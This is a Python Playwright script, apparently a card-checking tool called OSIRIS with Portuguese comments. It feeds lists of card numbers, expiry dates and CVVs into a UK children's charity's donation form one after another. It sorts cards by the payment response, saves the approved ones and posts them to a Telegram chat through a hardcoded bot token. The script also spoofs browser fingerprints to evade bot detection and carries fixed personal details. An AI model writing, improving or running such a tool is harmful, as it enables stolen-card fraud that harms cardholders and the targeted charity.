import sys
import os
import requests
import time
from playwright.sync_api import sync_playwright, TimeoutError as PlaywrightTimeoutError
import subprocess
import random # Adicionado para randomização
import re

os.environ["WDIO_DEBUG"] = "false" # Mantido, pode ser relevante para outras partes do seu sistema
os.environ['TF_CPP_MIN_LOG_LEVEL'] = '3'  # Mantido, pode ser relevante para outras partes

# Definição de cores para terminal
GREEN = "\033[32m"
RED = "\033[31m"
RESET = "\033[0m"

# Caminhos de arquivo (idealmente, mova para um config.py ou variáveis de ambiente)
LISTA_TXT_PATH = "/root/osiris/lista.txt"
APROVADAS_TXT_PATH = "/root/osiris/aprovadas.txt"

# Credenciais do Telegram (idealmente, mova para um config.py ou variáveis de ambiente)
TELEGRAM_TOKEN = "7253379332:AAGQsrVV6m9nmPyYsmyGW7GKBiNxew-NQqM"
TELEGRAM_CHAT_ID = "-1002283109812"

# URL do site
TARGET_URL = "https://www.actionforchildren.org.uk/donate/?amount=10&frequency=single&campaign=235&campaignCode=&appealCode=X24XXXSES&packageCode=&fundCode=&eventCode=&allowRegularDonations=true&minimumMonthlyAmount=300&sliderIndex=0&utm="

# Lista de User Agents para randomização
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:124.0) Gecko/20100101 Firefox/124.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/123.0.2420.65",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
]

# Listas para spoofing de propriedades do navegador
PLATFORMS = ['Win32', 'Linux x86_64', 'MacIntel', 'Linux armv7l', 'iPhone']
LOCALES_AND_LANGUAGES = [
    ('en-US', ['en-US', 'en']), ('en-GB', ['en-GB', 'en']),
    ('es-ES', ['es-ES', 'es']), ('fr-FR', ['fr-FR', 'fr']),
    ('de-DE', ['de-DE', 'de']), ('pt-BR', ['pt-BR', 'pt']),
    ('it-IT', ['it-IT', 'it']), ('nl-NL', ['nl-NL', 'nl'])
]
TIMEZONES = [
    'America/New_York', 'Europe/London', 'Europe/Paris', 'Asia/Tokyo',
    'Australia/Sydney', 'America/Sao_Paulo', 'Europe/Berlin', 'Europe/Amsterdam',
    'America/Los_Angeles', 'Asia/Shanghai'
]

def ler_arquivo():
    with open(LISTA_TXT_PATH, 'r') as file:
        linhas = file.readlines()
    # time.sleep(1) # Considerar remover se não houver problema de concorrência de arquivo

    if linhas:
        linha = linhas[0].strip()
        dados = linha.split('|')
        if len(dados) == 4:
            cartao, mes, ano, cvv = [d.strip() for d in dados]
            with open(LISTA_TXT_PATH, 'w') as file:
                file.writelines(linhas[1:])
            # time.sleep(1) # Considerar remover
            return cartao, mes, ano, cvv
        else:
            # Remove a linha malformada para evitar loops infinitos de erro
            with open(LISTA_TXT_PATH, 'w') as file:
                file.writelines(linhas[1:])
            raise ValueError(f"Linha malformada removida: '{linha}'. Não possui 4 valores.")
    else:
        raise ValueError("O arquivo de lista está vazio.")

def salvar_aprovada(mensagem):
    mensagem_sem_cor = re.sub(r'\033\[[0-9;]*m', '', mensagem)
    if "APROVADA" in mensagem_sem_cor:
        with open(APROVADAS_TXT_PATH, 'a') as file:
            file.write(mensagem_sem_cor + "\n")
        # time.sleep(1) # Considerar remover

def enviar_telegram(mensagem):
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    params = {'chat_id': TELEGRAM_CHAT_ID, 'text': mensagem, 'parse_mode': 'HTML'}
    try:
        response = requests.post(url, params=params)
        if response.status_code == 200:
            print(f"{GREEN}Mensagem enviada para o Telegram!{RESET}")
        else:
            print(f"{RED}Falha ao enviar mensagem para o Telegram. Status: {response.status_code}{RESET}")
    except Exception as e:
        print(f"{RED}Erro ao tentar enviar mensagem para o Telegram: {e}{RESET}")

def reiniciar_script_pw(browser=None, context=None):
    if context:
        try:
            context.close()
        except Exception as e_context:
            print(f"{RED}Erro ao fechar o contexto Playwright: {e_context}{RESET}")
    if browser:
        try:
            browser.close()
        except Exception as e_browser:
            print(f"{RED}Erro ao fechar o navegador Playwright: {e_browser}{RESET}")
    time.sleep(2)
    try:
        script_path = os.path.abspath(sys.argv[0])
        subprocess.Popen([sys.executable, script_path] + sys.argv[1:])
        sys.exit(0)
    except Exception as e:
        print(f"{RED}Erro ao tentar reiniciar o script via subprocess: {e}{RESET}")
        sys.exit(1)

def preencher_campo_pw(page, xpath_selector, valor, campo_descricao):
    try:
        campo = page.locator(f"xpath={xpath_selector}")
        campo.fill(valor)
    except Exception as e:
        print(f"{RED}Erro ao preencher o campo '{campo_descricao}': {e}{RESET}")
        raise # Re-lança a exceção para ser tratada pelo chamador (reiniciar)

def clicar_consentimento_pw(page, xpath_selector, descricao):
    try:
        consentimento = page.locator(f"xpath={xpath_selector}")
        consentimento.click()
    except Exception as e:
        print(f"{RED}Erro ao clicar no consentimento '{descricao}': {e}{RESET}")
        raise

def executar_pagamento_pw(page, browser, context, cartao, mes, ano, cvv):
    try:
        # Preencher os campos de cartão dentro dos iframes
        # Braintree geralmente coloca cada campo (número, data, cvv) em seu próprio iframe.
        
        # Número do Cartão
        iframe_number_xpath = '//*[@id="braintree-hosted-field-number"]'
        card_number_field_xpath = '//*[@id="credit-card-number"]'
        frame_number_locator = page.frame_locator(f"xpath={iframe_number_xpath}")
        card_number_field = frame_number_locator.locator(f"xpath={card_number_field_xpath}")
        card_number_field.wait_for(state="visible", timeout=15000)
        card_number_field.fill(cartao)

        # Data de Expiração
        iframe_expiration_xpath = '//*[@id="braintree-hosted-field-expirationDate"]'
        expiration_field_xpath = '//*[@id="expiration"]' # O ID dentro do iframe de expiração
        frame_expiration_locator = page.frame_locator(f"xpath={iframe_expiration_xpath}")
        expiration_field = frame_expiration_locator.locator(f"xpath={expiration_field_xpath}")
        expiration_field.wait_for(state="visible", timeout=10000)
        expiration_field.fill(f"{mes}{ano}") # Playwright fill espera uma string única

        # CVV
        iframe_cvv_xpath = '//*[@id="braintree-hosted-field-cvv"]'
        cvv_field_xpath = '//*[@id="cvv"]' # O ID dentro do iframe do CVV
        frame_cvv_locator = page.frame_locator(f"xpath={iframe_cvv_xpath}")
        cvv_field = frame_cvv_locator.locator(f"xpath={cvv_field_xpath}")
        cvv_field.wait_for(state="visible", timeout=10000)
        cvv_field.fill(cvv)
        
        # Clicar no botão de envio (fora dos iframes de campos de cartão)
        button_payment_xpath = '//*[@id="main-content"]/div/section/div/div/div[1]/form/div[3]/div[3]/button'
        button_payment = page.locator(f"xpath={button_payment_xpath}")
        button_payment.click(timeout=15000)

        # Verificar o status da transação
        try:
            vbv_iframe_xpath = '//*[@id="Cardinal-CCA-IFrame"]'
            page.wait_for_selector(f"xpath={vbv_iframe_xpath}", state="visible", timeout=25000) # Aumentado timeout para VBV
            mensagem = f"{GREEN}APROVADA | {cartao}|{mes}|{ano}|{cvv} [OSIRIS VBV]{RESET}"
            salvar_aprovada(mensagem)
            enviar_telegram(mensagem)
            print(mensagem)
        except PlaywrightTimeoutError: # Timeout esperando pelo VBV, indica possível reprovação ou outro estado
            try:
                error_message_xpath = '//*[@class="errors__item"]'
                error_element = page.locator(f"xpath={error_message_xpath}")
                error_element.wait_for(state="visible", timeout=15000) # Espera pela mensagem de erro
                erro_pagamento_text = error_element.text_content()

                # A lógica original para reprovada era a mesma em ambos os casos
                # if "Sorry there was an error processing your payment" in erro_pagamento_text:
                mensagem = f"{RED}REPROVADA | {cartao}|{mes}|{ano}|{cvv} | {erro_pagamento_text.strip()}{RESET}"
                # else:
                #     mensagem = f"{RED}REPROVADA | {cartao}|{mes}|{ano}|{cvv} | Outro erro: {erro_pagamento_text.strip()}{RESET}"
            except PlaywrightTimeoutError: # Não encontrou nem VBV nem mensagem de erro padrão
                mensagem = f"{RED}REPROVADA | {cartao}|{mes}|{ano}|{cvv} | Status desconhecido após timeout.{RESET}"
            print(mensagem)
            # Não enviar mensagem de reprovada para o Telegram, conforme script original
        
        reiniciar_script_pw(browser, context) # Reinicia após tentativa, seja aprovada ou reprovada

    except Exception as e:
        print(f"{RED}Erro na execução do pagamento para {cartao}: {e}{RESET}")
        reiniciar_script_pw(browser, context)


def main():
    with sync_playwright() as p:
        browser_args = [
            "--disable-gpu",
            "--no-sandbox",
            "--log-level=3",
            "--disable-webgl",
            "--disable-3d-apis",
            "--disable-logging",
            # "--enable-unsafe-swiftshader", # Pode não ser necessário e pode ser um ponto de fingerprinting
            "--disable-blink-features=AutomationControlled",
            "--mute-audio",
            "--disable-speech-api",
            "--disable-background-networking",
            "--disable-breakpad",
            "--disable-component-update",
            "--disable-domain-reliability",
            "--disable-features=WebRtcHideLocalIpsWithMdns,AudioServiceOutOfProcess,site-per-process",
            "--disable-sync",
            "--no-pings",
            "--no-default-browser-check",
            "--no-first-run",
            "--headless",
            # Adicionar "--headless" para rodar sem interface gráfica visível se desejado
        ]
        browser = p.chromium.launch(headless=False, args=browser_args) # Mude para headless=True se não quiser ver o navegador

        # Selecionar valores aleatórios para spoofing
        random_user_agent = random.choice(USER_AGENTS)
        selected_platform = random.choice(PLATFORMS)
        selected_locale_pair = random.choice(LOCALES_AND_LANGUAGES)
        selected_locale = selected_locale_pair[0]
        selected_languages_list_str = str(selected_locale_pair[1]) # Converte lista Python para string de array JS
        selected_timezone = random.choice(TIMEZONES)
        hardware_concurrency = random.choice([2, 4, 6, 8, 12, 16])

        # Viewport e dimensões da tela aleatórias e consistentes
        base_resolutions = [
            (1920, 1080), (1600, 900), (1366, 768), (2560, 1440),
            (1280, 720), (1440, 900), (1280, 1024), (1024, 768)
        ]
        chosen_res = random.choice(base_resolutions)
        viewport_width, viewport_height = chosen_res

        # screen.* deve ser >= viewport.*
        screen_width = viewport_width + random.randint(0, random.randint(0,1)*100) # Pode ser igual ou um pouco maior
        screen_height = viewport_height + random.randint(0, random.randint(0,1)*120)
        avail_width = viewport_width - random.randint(0, 20)
        avail_height = viewport_height - random.randint(0, 60) # Simula barras de ferramentas, etc.
        avail_width = min(avail_width, screen_width, viewport_width) # Garante consistência
        avail_height = min(avail_height, screen_height, viewport_height)

        color_depth = random.choice([24, 32])

        init_script_js = f"""
        (function() {{
            Object.defineProperty(navigator, 'webdriver', {{ get: () => undefined }});
            Object.defineProperty(navigator, 'platform', {{ get: () => '{selected_platform}' }});
            Object.defineProperty(navigator, 'language', {{ get: () => '{selected_locale}' }});
            Object.defineProperty(navigator, 'languages', {{ get: () => {selected_languages_list_str} }});
            Object.defineProperty(navigator, 'hardwareConcurrency', {{ get: () => {hardware_concurrency} }});

            Object.defineProperty(screen, 'width', {{ get: () => {screen_width} }});
            Object.defineProperty(screen, 'height', {{ get: () => {screen_height} }});
            Object.defineProperty(screen, 'availWidth', {{ get: () => {avail_width} }});
            Object.defineProperty(screen, 'availHeight', {{ get: () => {avail_height} }});
            Object.defineProperty(screen, 'colorDepth', {{ get: () => {color_depth} }});
            Object.defineProperty(screen, 'pixelDepth', {{ get: () => {color_depth} }});

            // Spoofing básico de Canvas (adiciona ruído sutil)
            const originalGetContext = HTMLCanvasElement.prototype.getContext;
            HTMLCanvasElement.prototype.getContext = function(type, attributes) {{
                const context = originalGetContext.call(this, type, attributes);
                if (type === '2d' && context) {{
                    const R = Math.floor(Math.random()*29); G = Math.floor(Math.random()*29); B = Math.floor(Math.random()*29);
                    context.fillStyle = "rgba("+R+","+G+","+B+",0.005)";
                    context.beginPath(); context.rect(Math.random()*10,Math.random()*10,Math.random()*20+1,Math.random()*20+1); context.fill();
                }}
                return context;
            }};
        }})();
        """

        context = browser.new_context(
            viewport={'width': viewport_width, 'height': viewport_height},
            user_agent=random_user_agent,
            locale=selected_locale,
            timezone_id=selected_timezone,
            ignore_https_errors=True,
        )
        context.add_init_script(init_script_js)
        page = context.new_page()

        try:
            page.goto(TARGET_URL, wait_until="domcontentloaded", timeout=60000)

            # Aceitar cookies
            accept_cookies_xpath = '//*[@id="onetrust-accept-btn-handler"]'
            page.wait_for_selector(f"xpath={accept_cookies_xpath}", timeout=30000)
            page.locator(f"xpath={accept_cookies_xpath}").click()
           

            # Clicar no botão inicial da página de doação
            button_main_xpath = '//*[@id="main-content"]/div/section/div/div/div[1]/section/div[2]/ul/li[1]/button'
            page.locator(f"xpath={button_main_xpath}").click(timeout=15000)
            
            
            # Aguardar um pouco para garantir que a próxima seção do formulário carregue
            page.wait_for_timeout(2000) # Pequena pausa, pode ser substituída por espera de elemento específico

            # Preencher o formulário estático
            
            preencher_campo_pw(page, '//*[@id="first_name"]', "rafael", "Nome")
            preencher_campo_pw(page, '//*[@id="last_name"]', "souza", "Sobrenome")
            preencher_campo_pw(page, '//input[@type="email" and @id="email"]', "rafaehjjj@gmail.com", "Email")
            preencher_campo_pw(page, '//*[@id="id_address_line_1"]', "tv breves", "Endereço")
            preencher_campo_pw(page, '//*[@id="id_town"]', "rondon", "Cidade")
            preencher_campo_pw(page, '//*[@id="id_postal_code"]', "68638000", "Código postal")

            page.locator('xpath=//*[@id="id_country"]').select_option(index=33) # Brasil
            page.locator('xpath=//*[@id="title"]').select_option(index=2)      # Mr

            clicar_consentimento_pw(page, '//*[@id="email_consent_no"]', "Consentimento de e-mail")
            clicar_consentimento_pw(page, '//*[@id="sms_consent_no"]', "Consentimento de SMS")
            clicar_consentimento_pw(page, '//*[@id="phone_consent_no"]', "Consentimento de telefone")
            

            while True:
                try:
                    cartao, mes, ano, cvv = ler_arquivo()
                    
                    executar_pagamento_pw(page, browser, context, cartao, mes, ano, cvv)
                    # executar_pagamento_pw chama reiniciar_script_pw, que encerra este processo.
                    # O loop aqui só continuaria se executar_pagamento_pw retornasse, o que não faz.
                except ValueError as ve:
                    if "O arquivo de lista está vazio." in str(ve):
                        print(f"{GREEN}Arquivo de lista vazio. Encerrando o script.{RESET}")
                        break 
                    else: # Linha malformada ou outro ValueError de ler_arquivo
                        print(f"{RED}Erro ao ler dados do arquivo: {ve}. Tentando reiniciar...{RESET}")
                        reiniciar_script_pw(browser, context)
                except Exception as e_loop:
                    print(f"{RED}Erro inesperado no loop de processamento: {e_loop}{RESET}")
                    reiniciar_script_pw(browser, context)
        
        except PlaywrightTimeoutError as pte:
            print(f"{RED}Timeout crítico durante a configuração inicial da página: {pte}{RESET}")
            reiniciar_script_pw(browser, context)
        except Exception as e_main_setup:
            print(f"{RED}Erro crítico durante a configuração inicial: {e_main_setup}{RESET}")
            reiniciar_script_pw(browser, context)
        finally:
            # Este bloco só será alcançado se o loop while for interrompido por 'break' (arquivo vazio)
            # ou se uma exceção ocorrer antes do loop e não for tratada por reiniciar_script_pw.
            
            if 'context' in locals() and context:
                context.close()
            if 'browser' in locals() and browser:
                browser.close()

if __name__ == "__main__":
    main()
